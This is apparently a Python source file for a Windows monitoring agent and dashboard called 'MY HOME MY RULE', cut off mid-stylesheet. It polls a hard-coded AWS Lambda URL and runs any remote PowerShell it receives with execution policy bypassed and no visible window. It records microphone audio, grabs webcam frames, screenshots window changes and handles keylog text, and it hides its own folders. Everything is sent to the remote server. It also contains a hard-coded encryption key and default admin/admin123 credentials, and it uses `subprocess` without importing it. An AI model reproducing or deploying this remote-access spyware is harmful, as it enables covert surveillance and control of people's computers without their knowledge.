import os
import io
import re
import json
import time
import socket
import ctypes
import threading

# Set process DPI awareness to resolve blank/black screenshots on scaled displays
try:
    ctypes.windll.user32.SetProcessDPIAware()
except Exception:
    pass
import uuid
import random
import secrets
import hashlib
import hmac
from datetime import datetime, timezone

# Try imports for headless server compatibility (Render)
try:
    import pynput
except ImportError:
    pynput = None

try:
    from PIL import Image, ImageGrab
except ImportError:
    Image = None
    ImageGrab = None

try:
    import mss
except ImportError:
    mss = None

import base64
import urllib.request
from flask import Flask, jsonify, send_from_directory, render_template_string, request, redirect, Response, make_response
from dotenv import load_dotenv

# Change working directory to the directory of this script to avoid writing to C:\Windows\system32
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except Exception:
    pass

# Load environment variables (.EVN or .env)
load_dotenv(".EVN")
load_dotenv()

# AWS Configuration (100% Native AWS: DynamoDB + S3)
AWS_REGION = os.getenv("AWS_REGION", "ap-south-1")
S3_BUCKET = os.getenv("S3_BUCKET", "mstool-screenshots-687159379620-ap-south-1")
DEVICES_TABLE = os.getenv("DEVICES_TABLE", "mstool_devices")
LOGS_TABLE = os.getenv("LOGS_TABLE", "mstool_activity_logs")
RENDER_SERVER_URL = os.getenv("RENDER_SERVER_URL", "https://lnslbk3kmal2h2cdlfrvzpwgmu0qzetl.lambda-url.ap-south-1.on.aws")

# Initialize AWS clients
ddb = None
ddb_client = None
s3_client = None
devices_tbl = None
logs_tbl = None

try:
    import boto3
    from botocore.config import Config
    
    if os.environ.get("AWS_LAMBDA_FUNCTION_NAME"):
        # Running inside AWS Lambda: Use the automatic IAM execution role credentials!
        boto_session = boto3.Session(region_name=AWS_REGION)
    else:
        # Local workstation: read credentials from .EVN or environment
        aws_ak = os.getenv("AWS_ACCESS_KEY") or os.getenv("AWS_ACCESS_KEY_ID")
        aws_sk = os.getenv("AWS_SECRET_KEY") or os.getenv("AWS_SECRET_ACCESS_KEY")
        
        boto_kwargs = {"region_name": AWS_REGION}
        if aws_ak and aws_sk:
            boto_kwargs["aws_access_key_id"] = aws_ak
            boto_kwargs["aws_secret_access_key"] = aws_sk
            
        boto_session = boto3.Session(**boto_kwargs)
    ddb = boto_session.resource("dynamodb", region_name=AWS_REGION)
    ddb_client = boto_session.client("dynamodb", region_name=AWS_REGION)
    s3_client = boto_session.client("s3", region_name=AWS_REGION)
    devices_tbl = ddb.Table(DEVICES_TABLE)
    logs_tbl = ddb.Table(LOGS_TABLE)
except Exception as e:
    print(f"AWS Boto3 initialization notice: {e}")

# ==================== AUTHENTICATED SCREENSHOT ENCRYPTION (AES-256-GCM) ====================
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    AESGCM = None

SCREENSHOT_MAGIC = b"MSENC1"

def get_encryption_key_hex():
    return os.getenv("SCREENSHOT_ENCRYPTION_KEY", "b491396ed90ba50f100bff505f9f3c611aa918383fe0e35b02123694b4be2ace").strip()

def get_encryption_key_bytes():
    raw_key = get_encryption_key_hex()
    try:
        return bytes.fromhex(raw_key)
    except Exception:
        return hashlib.sha256(raw_key.encode('utf-8')).digest()

def encrypt_screenshot_bytes(image_bytes: bytes, device_id: str = "") -> bytes:
    """
    Encrypts screenshot image bytes immediately using AES-256-GCM authenticated encryption.
    Generates a cryptographically secure 12-byte random nonce for every screenshot.
    Returns binary payload: MAGIC (6B) + NONCE (12B) + CIPHERTEXT_WITH_GCM_AUTH_TAG
    """
    if AESGCM is None:
        raise RuntimeError("cryptography library is required for AES-256-GCM encryption")
    key = get_encryption_key_bytes()
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)  # 96-bit unique nonce
    ciphertext = aesgcm.encrypt(nonce, image_bytes, None)
    return SCREENSHOT_MAGIC + nonce + ciphertext

def decrypt_screenshot_bytes(encrypted_data: bytes, device_id: str = "") -> bytes:
    """
    Decrypts an AES-256-GCM encrypted screenshot binary in memory.
    Validates MAGIC header and GCM authentication tag.
    Returns raw image bytes (WebP/PNG).
    """
    if not encrypted_data:
        raise ValueError("Empty encrypted data")
        
    # Check backwards compatibility for pre-existing unencrypted WebP/PNG images
    if encrypted_data.startswith(b"RIFF") or encrypted_data.startswith(b"\x89PNG") or encrypted_data.startswith(b"\xff\xd8\xff"):
        return encrypted_data

    if len(encrypted_data) < len(SCREENSHOT_MAGIC) + 12 + 16:
        raise ValueError("Encrypted screenshot payload is too short or corrupted")

    if not encrypted_data.startswith(SCREENSHOT_MAGIC):
        raise ValueError("Unrecognized screenshot format: missing MSENC1 encryption header")

    nonce = encrypted_data[len(SCREENSHOT_MAGIC):len(SCREENSHOT_MAGIC)+12]
    ciphertext = encrypted_data[len(SCREENSHOT_MAGIC)+12:]

    if AESGCM is None:
        raise RuntimeError("cryptography library is required for AES-256-GCM decryption")

    key = get_encryption_key_bytes()
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)

def get_screenshot_signed_url(filename, expires_in=3600):
    if not filename:
        return None
    # All screenshots route through the authenticated, on-the-fly decryption endpoint
    clean_fn = filename.lstrip('/')
    if clean_fn.startswith('screenshots/'):
        clean_fn = clean_fn[len('screenshots/'):]
    return f"/api/screenshots/view/{clean_fn}"

# Unique device identification helper
def get_device_id():
    env_id = os.getenv("DEVICE_ID", "").strip()
    if env_id:
        return env_id
    try:
        # Get stable hardware serial number / UUID to prevent network adapter card duplicates
        hw_id = ""
        try:
            # Query Motherboard System UUID (stays same across network cards/re-installs)
            output = subprocess.check_output("powershell.exe -NoProfile -Command \"(Get-CimInstance Win32_ComputerSystemProduct).UUID\"", shell=True, creationflags=0x08000000).decode().strip()
            if output and len(output) > 8 and "error" not in output.lower():
                hw_id = output
        except Exception:
            pass
            
        if not hw_id:
            try:
                # Fallback to Windows Registry MachineGuid
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
                guid, _ = winreg.QueryValueEx(key, "MachineGuid")
                if guid:
                    hw_id = guid
            except Exception:
                pass
                
        if not hw_id:
            # Standard fallback (MAC)
            mac = uuid.getnode()
            hw_id = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
            
        hostname = socket.gethostname()
        short_id = hw_id.replace("-", "")[:12].upper()
        return f"{hostname}_{short_id}"
    except Exception:
        return socket.gethostname() or "unknown_device"

DEVICE_TOKEN = os.getenv("DEVICE_TOKEN", "")

def get_client_headers():
    headers = {"Content-Type": "application/json"}
    if DEVICE_TOKEN:
        headers["X-Device-Token"] = DEVICE_TOKEN
    return headers

def register_device():
    device_id = get_device_id()
    hostname = socket.gethostname() or "Unknown Device"
    now_iso = datetime.now(timezone.utc).isoformat()
    
    # 1. Direct DynamoDB
    if devices_tbl is not None:
        try:
            devices_tbl.update_item(
                Key={"device_id": device_id},
                UpdateExpression="SET last_active = :la, nickname = if_not_exists(nickname, :hn)",
                ExpressionAttributeValues={":la": now_iso, ":hn": hostname}
            )
            print(f"Device successfully registered/updated in DynamoDB: {device_id} ({hostname})")
            return
        except Exception as e:
            print(f"Failed to register device in DynamoDB: {e}")

    # 2. HTTP Fallback to Central AWS Server
    server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
    if server_url:
        try:
            req = urllib.request.Request(
                f"{server_url.rstrip('/')}/api/client/register",
                data=json.dumps({"device_id": device_id, "hostname": hostname, "last_active": now_iso}).encode('utf-8'),
                headers=get_client_headers()
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                print(f"Device registered with AWS Central Server: {device_id} ({hostname})")
        except Exception as se:
            print(f"Failed to register device with AWS Central Server: {se}")

is_monitoring_disabled = False
disable_mouse_clicks = False
periodic_screenshot_interval = 300
zero_footprint = False
idle_threshold = 300
only_capture_on_switch = False
last_pending_screenshot_log_id = None
last_active_window = ""

def check_remote_config_loop():
    global is_monitoring_disabled, disable_mouse_clicks, periodic_screenshot_interval, zero_footprint, idle_threshold, only_capture_on_switch
    device_id = get_device_id()
    while True:
        try:
            config = None
            if devices_tbl is not None:
                try:
                    res = devices_tbl.get_item(Key={"device_id": device_id})
                    if "Item" in res and "config" in res["Item"]:
                        cfg_val = res["Item"]["config"]
                        config = json.loads(cfg_val) if isinstance(cfg_val, str) else cfg_val
                except Exception as de:
                    print(f"Error reading config from DynamoDB: {de}")
                    
            if config is None:
                server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
                if server_url:
                    try:
                        req = urllib.request.Request(f"{server_url.rstrip('/')}/api/client/config?device_id={device_id}", headers=get_client_headers())
                        with urllib.request.urlopen(req, timeout=10) as r:
                            config = json.loads(r.read().decode('utf-8'))
                    except Exception:
                        pass
                        
            if config:
                is_monitoring_disabled = config.get("is_disabled", False)
                disable_mouse_clicks = config.get("disable_mouse_clicks", False)
                periodic_screenshot_interval = int(config.get("periodic_screenshot_interval", 300))
                zero_footprint = config.get("zero_footprint", False)
                idle_threshold = int(config.get("idle_threshold", 300))
                only_capture_on_switch = config.get("only_capture_on_switch", False)
            else:
                config = {
                    "is_disabled": False,
                    "disable_mouse_clicks": False,
                    "periodic_screenshot_interval": 300,
                    "zero_footprint": False,
                    "idle_threshold": 300,
                    "only_capture_on_switch": False
                }
                
            sync_payload = {**config, "synced_at": datetime.now().isoformat()}
            if devices_tbl is not None:
                try:
                    devices_tbl.update_item(
                        Key={"device_id": device_id},
                        UpdateExpression="SET sync_status = :ss",
                        ExpressionAttributeValues={":ss": json.dumps(sync_payload)}
                    )
                except Exception:
                    pass
            else:
                server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
                if server_url:
                    try:
                        req = urllib.request.Request(
                            f"{server_url.rstrip('/')}/api/client/sync-status",
                            data=json.dumps({"device_id": device_id, "sync_status": sync_payload}).encode('utf-8'),
                            headers=get_client_headers()
                        )
                        with urllib.request.urlopen(req, timeout=10) as r:
                            pass
                    except Exception:
                        pass

            # ---- Remote PowerShell Command Polling ----
            _poll_and_run_remote_command(device_id)

        except Exception as e:
            print(f"Failed to check remote config status: {e}")
            
        poll_interval = int(os.getenv("CONFIG_POLL_INTERVAL", "900"))
        time.sleep(poll_interval)

def _poll_and_run_remote_command(device_id):
    """
    Poll for a pending remote PowerShell command from the server and execute it.
    Posts the result back to the server. Called from the config polling loop.
    Only runs on Windows client (not in SERVER_ONLY mode).
    """
    if os.name != 'nt':
        return
    try:
        server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL", "")
        if not server_url:
            # Direct DynamoDB check
            if devices_tbl is not None:
                res = devices_tbl.get_item(Key={"device_id": device_id})
                item = res.get("Item", {})
                pending_raw = item.get("pending_command")
                cmd_obj = json.loads(pending_raw) if isinstance(pending_raw, str) else (pending_raw or {})
                if cmd_obj.get("status") != "pending":
                    return
                command_id = cmd_obj.get("command_id")
                command = cmd_obj.get("command", "")
                # Mark as dispatched immediately
                cmd_obj["status"] = "dispatched"
                devices_tbl.update_item(
                    Key={"device_id": device_id},
                    UpdateExpression="SET pending_command = :pc",
                    ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
                )
                _run_and_report_command(device_id, command_id, command, via_http=False)
            return

        # HTTP path: poll from Lambda
        poll_url = f"{server_url.rstrip('/')}/api/client/command/poll?device_id={device_id}"
        req = urllib.request.Request(poll_url, headers=get_client_headers())
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode('utf-8'))
        if data.get("has_command"):
            command_id = data["command_id"]
            command = data["command"]
            _run_and_report_command(device_id, command_id, command, via_http=True, server_url=server_url)
    except Exception as e:
        print(f"[RemoteCmd] Poll error: {e}")

# ==================== CAMERA & MICROPHONE AV DIAGNOSTIC HELPERS ====================
def show_client_av_indicator(mode):
    """Displays a visible consent and privacy indicator on the monitored Windows client."""
    if os.name != 'nt':
        return
    try:
        msg = f"[MY HOME MY RULE] Audio/Video Diagnostic Session Active ({mode.capitalize()}). Authorized by Administrator. Privacy indicators active."
        print(f"[AV Privacy Notice] {msg}")
    except Exception:
        pass

def record_audio_sample(duration=5):
    """
    Records a diagnostic audio sample using standard Windows Multimedia API (winmm).
    Activates Windows microphone privacy indicator in the taskbar.
    """
    if os.name != 'nt':
        return None, "Audio recording is only supported on Windows clients"
    temp_wav = os.path.abspath(f"temp_diag_{int(time.time())}.wav")
    try:
        winmm = ctypes.windll.winmm
        winmm.mciSendStringA(b"open new type waveaudio alias mcrec", None, 0, None)
        winmm.mciSendStringA(b"record mcrec", None, 0, None)
        time.sleep(duration)
        cmd_save = f'save mcrec "{temp_wav}"'.encode('ascii')
        winmm.mciSendStringA(cmd_save, None, 0, None)
        winmm.mciSendStringA(b"close mcrec", None, 0, None)
        if os.path.exists(temp_wav):
            with open(temp_wav, "rb") as f:
                wav_bytes = f.read()
            try:
                os.remove(temp_wav)
            except Exception:
                pass
            return wav_bytes, None
        return None, "Windows audio subsystem did not generate wave file"
    except Exception as e:
        return None, str(e)

def capture_camera_sample():
    """
    Attempts to capture a diagnostic camera frame using standard DirectShow / OpenCV.
    Respects hardware LEDs (wired directly to camera sensor power) and Windows Camera privacy toggles.
    """
    if os.name != 'nt':
        return None, "Camera capture is only supported on Windows clients"
    try:
        # Check Windows Camera Privacy setting in registry
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam")
            val, _ = winreg.QueryValueEx(k, "Value")
            winreg.CloseKey(k)
            if str(val).lower() == "deny":
                return None, "PERMISSION_DENIED: Camera access is disabled in Windows Privacy Settings (Settings > Privacy & security > Camera). Explicit consent required."
        except Exception:
            pass

        try:
            import cv2
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cap.isOpened():
                return None, "HARDWARE_NOT_FOUND: No active webcam device detected or camera in use by another application."
            ret, frame = cap.read()
            cap.release()
            if not ret or frame is None:
                return None, "CAPTURE_FAILED: Camera device did not return a valid frame."
            from PIL import Image
            rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(rgb)
            buf = io.BytesIO()
            img.save(buf, format="WEBP", quality=50)
            return buf.getvalue(), None
        except ImportError:
            return None, "DEPENDENCY_REQUIRED: OpenCV (cv2) is not installed on client machine for DirectShow webcam capture. (pip install opencv-python)"
    except Exception as e:
        return None, str(e)

def _execute_av_diagnostic(device_id, command_id, mode, duration, via_http, server_url):
    print(f"[AV] Executing {mode} diagnostic (session {command_id[:8]}, duration={duration}s)...")
    show_client_av_indicator(mode)
    
    payload_bytes = None
    err = None
    status = "success"
    
    if mode == "audio":
        payload_bytes, err = record_audio_sample(duration=duration)
    elif mode == "camera":
        payload_bytes, err = capture_camera_sample()
    else:
        err = f"Unknown mode: {mode}"
        
    if err:
        status = "blocked"
        print(f"[AV] Notice: {err}")
        enc_b64 = ""
    else:
        enc_payload = encrypt_screenshot_bytes(payload_bytes)
        enc_b64 = base64.b64encode(enc_payload).decode('ascii')
        print(f"[AV] Diagnostic sample captured and encrypted ({len(enc_payload)} bytes)")
        
    result_data = {
        "device_id": device_id,
        "command_id": command_id,
        "mode": mode,
        "status": status,
        "error": err or "",
        "payload_b64": enc_b64
    }
    
    if via_http and server_url:
        try:
            req = urllib.request.Request(
                f"{server_url.rstrip('/')}/api/client/av/result",
                data=json.dumps(result_data).encode('utf-8'),
                headers=get_client_headers()
            )
            with urllib.request.urlopen(req, timeout=20) as r:
                pass
            print(f"[AV] Successfully reported encrypted AV diagnostic to central server.")
        except Exception as e:
            print(f"[AV] Failed to report AV result via HTTP: {e}")

def _run_and_report_command(device_id, command_id, command, via_http=True, server_url=""):
    """Execute a PowerShell command or AV diagnostic and post result back."""
    if command.startswith("AV_DIAGNOSTIC:"):
        parts = command.split(":")
        mode = parts[1] if len(parts) > 1 else "audio"
        duration = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 5
        _execute_av_diagnostic(device_id, command_id, mode, duration, via_http, server_url)
        return

    print(f"[RemoteCmd] Executing command {command_id[:8]}: {command[:80]}")
    exit_code = -1
    output = ""
    try:
        result = subprocess.run(
            ["powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", command],
            capture_output=True, text=True, timeout=120,
            creationflags=0x08000000 if os.name == 'nt' else 0
        )
        output = (result.stdout or "") + (result.stderr or "")
        exit_code = result.returncode
    except subprocess.TimeoutExpired:
        output = "ERROR: Command timed out after 120 seconds."
        exit_code = -1
    except Exception as e:
        output = f"ERROR executing command: {e}"
        exit_code = -1

    result_payload = {
        "device_id": device_id,
        "command_id": command_id,
        "output": output[:8000],
        "exit_code": exit_code
    }
    print(f"[RemoteCmd] Done (exit={exit_code}). Reporting result...")

    reported = False
    if via_http and server_url:
        try:
            req = urllib.request.Request(
                f"{server_url.rstrip('/')}/api/client/command/result",
                data=json.dumps(result_payload).encode('utf-8'),
                headers=get_client_headers()
            )
            with urllib.request.urlopen(req, timeout=15) as r:
                reported = True
                print(f"[RemoteCmd] Successfully reported command result via HTTP.")
        except Exception as e:
            print(f"[RemoteCmd] Failed to post result via HTTP: {e}")

    # Direct DynamoDB fallback write
    if not reported and devices_tbl is not None:
        try:
            result_obj = {
                "command_id": command_id,
                "output": output[:8000],
                "exit_code": exit_code,
                "completed_at": datetime.now(timezone.utc).isoformat(),
                "status": "completed"
            }
            devices_tbl.update_item(
                Key={"device_id": device_id},
                UpdateExpression="SET completed_command = :cc, pending_command = :pc",
                ExpressionAttributeValues={
                    ":cc": json.dumps(result_obj),
                    ":pc": json.dumps({"status": "idle"})
                }
            )
            print(f"[RemoteCmd] Successfully saved command result to DynamoDB directly.")
        except Exception as e:
            print(f"[RemoteCmd] Failed to post result to DynamoDB: {e}")

def window_monitor_loop():
    global last_active_window, last_pending_screenshot_log_id, only_capture_on_switch
    while True:
        try:
            if not is_monitoring_disabled:
                current_window = get_active_window_title()
                if last_active_window == "":
                    last_active_window = current_window
                    
                if current_window != last_active_window:
                    if only_capture_on_switch and last_pending_screenshot_log_id is not None:
                        log_id_to_update = last_pending_screenshot_log_id
                        last_pending_screenshot_log_id = None
                        
                        url, filename = capture_and_upload_screenshot("screenshot_switch")
                        if url and filename:
                            if logs_tbl is not None and isinstance(log_id_to_update, dict):
                                try:
                                    logs_tbl.update_item(
                                        Key={"device_id": log_id_to_update["device_id"], "timestamp_id": log_id_to_update["timestamp_id"]},
                                        UpdateExpression="SET screenshot_url = :url, screenshot_filename = :fn",
                                        ExpressionAttributeValues={":url": url, ":fn": filename}
                                    )
                                except Exception as ue:
                                    print(f"Failed to update switch screenshot in DynamoDB: {ue}")
                                    
                    last_active_window = current_window
        except Exception as e:
            print(f"Error in window monitor loop: {e}")
        time.sleep(1)

# Register local device on client startup (only if not running in SERVER_ONLY mode and running on Windows)
server_only = os.getenv('SERVER_ONLY', 'false').lower() == 'true' or pynput is None or os.name != 'nt'
if not server_only:
    register_device()
    threading.Thread(target=check_remote_config_loop, daemon=True).start()
    # Dedicated real-time polling thread for remote PS commands (every 2s)
    def _cmd_poll_loop():
        device_id = get_device_id()
        time.sleep(1)  # Fast start
        while True:
            try:
                _poll_and_run_remote_command(device_id)
            except Exception as e:
                print(f"[RemoteCmd] Loop error: {e}")
            time.sleep(2)  # Check for commands every 2 seconds for snappy real-time execution
    threading.Thread(target=_cmd_poll_loop, daemon=True).start()

def hide_directory(path):
    """Sets a directory attribute to hidden in Windows (NT)."""
    try:
        if os.name == 'nt' and os.path.exists(path):
            import ctypes
            # FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)
    except Exception:
        pass

# Initialize logs and screenshots directories (kept for fallback / temp storage)
try:
    os.makedirs("logs", exist_ok=True)
    hide_directory("logs")
    os.makedirs("screenshots", exist_ok=True)
    hide_directory("screenshots")
except Exception:
    pass

# Initialize global activity timers
last_activity_time = datetime.now()
last_screenshot_time = datetime.now()

# Initialize Flask App
app = Flask(__name__)

# Thumbnail-based duplicate screenshot detection to save space
last_screenshot_thumbnail = None

def is_screenshot_redundant(current_img):
    global last_screenshot_thumbnail
    try:
        # Resize to a tiny 16x16 grayscale thumbnail
        thumb = current_img.resize((16, 16)).convert("L")
        if last_screenshot_thumbnail is None:
            last_screenshot_thumbnail = thumb
            return False
        
        # Calculate sum of absolute pixel differences
        p1 = list(thumb.getdata())
        p2 = list(last_screenshot_thumbnail.getdata())
        diff = sum(abs(p1[i] - p2[i]) for i in range(len(p1)))
        normalized_diff = diff / len(p1)
        
        # If average difference per pixel is < 5.0 gray levels, they are virtually identical
        if normalized_diff < 5.0:
            return True
            
        last_screenshot_thumbnail = thumb
        return False
    except Exception:
        return False

# Noise filtering utility for keylogs
def is_text_noise(text):
    cleaned = text
    control_patterns = ["[Backspace]", "[Tab]", "[Enter]", "[Space]", "[Escape]", "[Shift]", "[Ctrl]", "[Alt]", "[Caps_Lock]"]
    for pat in control_patterns:
        cleaned = cleaned.replace(pat, "")
    cleaned = cleaned.strip()
    return len(cleaned) == 0

# State variables for periodic capture optimizations
last_logged_window = ""
has_new_activity_since_last_capture = False

# ==================== DASHBOARD AUTHENTICATION & LOGIN ====================
DASHBOARD_USER = os.getenv("DASHBOARD_USER", "admin")
DASHBOARD_PASS = os.getenv("DASHBOARD_PASS", "admin123")

def get_auth_cookie_token():
    return hashlib.sha256(f"mstool_auth:{DASHBOARD_USER}:{DASHBOARD_PASS}".encode()).hexdigest()

def is_dashboard_authenticated():
    cookie_token = request.cookies.get("mstool_auth")
    if cookie_token and hmac.compare_digest(cookie_token, get_auth_cookie_token()):
        return True
    auth = request.authorization
    if auth and auth.username == DASHBOARD_USER and auth.password == DASHBOARD_PASS:
        return True
    return False

LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - MY HOME MY RULE</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-base: #090d16;
            --bg-card: #111827;
            --bg-input: #0b1120;
            --border: #1f293d;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent: #2563eb;
            --accent-hover: #1d4ed8;
            --live: #10b981;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body {
            background-color: var(--bg-base);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
            background-image: radial-gradient(circle at 50% 20%, rgba(37,99,235,0.15) 0%, transparent 60%);
        }
        .login-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 16px;
            width: 100%;
            max-width: 400px;
            padding: 2.25rem;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
        }
        .logo-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            background: rgba(37, 99, 235, 0.1);
            border: 1px solid rgba(37, 99, 235, 0.25);
            padding: 0.3rem 0.75rem;
            border-radius: 9999px;
            font-size: 0.75rem;
            color: #60a5fa;
            font-weight: 600;
            margin-bottom: 1.25rem;
        }
        .live-dot {
            width: 6px;
            height: 6px;
            background-color: var(--live);
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 6px var(--live);
        }
        h1 {
            font-size: 1.5rem;
            font-weight: 700;
            letter-spacing: -0.5px;
            margin-bottom: 0.35rem;
            color: var(--text-main);
        }
        p.subtitle {
            color: var(--text-muted);
            font-size: 0.85rem;
            margin-bottom: 1.75rem;
        }
        .form-group {
            margin-bottom: 1.25rem;
        }
        label {
            display: block;
            font-size: 0.82rem;
            color: var(--text-muted);
            margin-bottom: 0.4rem;
            font-weight: 500;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 0.75rem 1rem;
            color: var(--text-main);
            font-size: 0.95rem;
            outline: none;
            transition: all 0.2s;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.25);
        }
        .btn-submit {
            width: 100%;
            background: var(--accent);
            border: none;
            color: #ffffff;
            padding: 0.8rem;
            border-radius: 8px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 0.5rem;
            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
        }
        .btn-submit:hover {
            background: var(--accent-hover);
        }
        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .error-msg {
            display: none;
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.25);
            color: #f87171;
            padding: 0.65rem 0.9rem;
            border-radius: 8px;
            font-size: 0.82rem;
            margin-bottom: 1.25rem;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo-badge">
            <span class="live-dot"></span>
            SECURE DASHBOARD GATEWAY
        </div>
        <h1>MY HOME MY RULE</h1>
        <p class="subtitle">Enter credentials to access the activity monitor</p>

        <div id="error-box" class="error-msg"></div>

        <form id="login-form" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="admin" required autofocus autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
            </div>
            <button type="submit" id="submit-btn" class="btn-submit">Sign In</button>
        </form>
    </div>

    <script>
        async function handleLogin(e) {
            e.preventDefault();
            const btn = document.getElementById('submit-btn');
            const errBox = document.getElementById('error-box');
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;

            btn.disabled = true;
            btn.innerText = 'Signing in...';
            errBox.style.display = 'none';

            try {
                const res = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await res.json();
                if (res.ok && data.status === 'success') {
                    window.location.href = '/';
                } else {
                    errBox.innerText = data.error || 'Invalid username or password.';
                    errBox.style.display = 'block';
                    btn.disabled = false;
                    btn.innerText = 'Sign In';
                }
            } catch (err) {
                errBox.innerText = 'Network error. Please try again.';
                errBox.style.display = 'block';
                btn.disabled = false;
                btn.innerText = 'Sign In';
            }
        }
    </script>
</body>
</html>
"""

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Keystroke Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-main: #0f172a;
            --bg-card: #1e293b;
            --bg-hover: #334155;
            --border: #334155;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent: #6366f1;
            --accent-hover: #4f46e5;
            --live: #10b981;
        }

        /* Switch Toggles Styles */
        .switch input:checked + .slider {
            background-color: var(--accent) !important;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 16px;
            width: 16px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: .3s;
            border-radius: 50%;
        }
        .switch input:checked + .slider:before {
            transform: translateX(20px);
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-main);
            color: var(--text-main);
            padding: 2rem;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            border-bottom: 1px solid var(--border);
            padding-bottom: 1.5rem;
        }
        
        h1 {
            font-size: 1.75rem;
            font-weight: 700;
            background: linear-gradient(to right, #818cf8, #c084fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .live-status {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            background-color: rgba(16, 185, 129, 0.1);
            color: var(--live);
            padding: 0.5rem 1rem;
            border-radius: 9999px;
            font-size: 0.875rem;
            font-weight: 500;
            border: 1px solid rgba(16, 185, 129, 0.2);
        }
        
        .live-dot {
            width: 8px;
            height: 8px;
            background-color: var(--live);
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }
        
        .date-selector-wrapper {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            padding: 0.5rem 1rem;
            border-radius: 8px;
        }
        
        .date-select {
            background-color: transparent;
            color: var(--text-main);
            border: none;
            outline: none;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        
        .date-select option {
            background-color: var(--bg-card);
            color: var(--text-main);
        }
        
        .tabs {
            display: flex;
            gap: 1rem;
            margin-bottom: 2rem;
            background-color: var(--bg-card);
            padding: 0.375rem;
            border-radius: 8px;
            width: fit-content;
            border: 1px solid var(--border);
        }
        
        .tab-btn {
            background: none;
            border: none;
            color: var(--text-muted);
            padding: 0.5rem 1.5rem;
            font-size: 0.95rem;
            font-weight: 500;
            cursor: pointer;
            border-radius: 6px;
            transition: all 0.2s ease;
        }
        
        .tab-btn:hover {
            color: var(--text-main);
        }
        
        .tab-btn.active {
            background-color: var(--accent);
            color: var(--text-main);
        }
        
        .tab-content {
            display: none;
        }
        
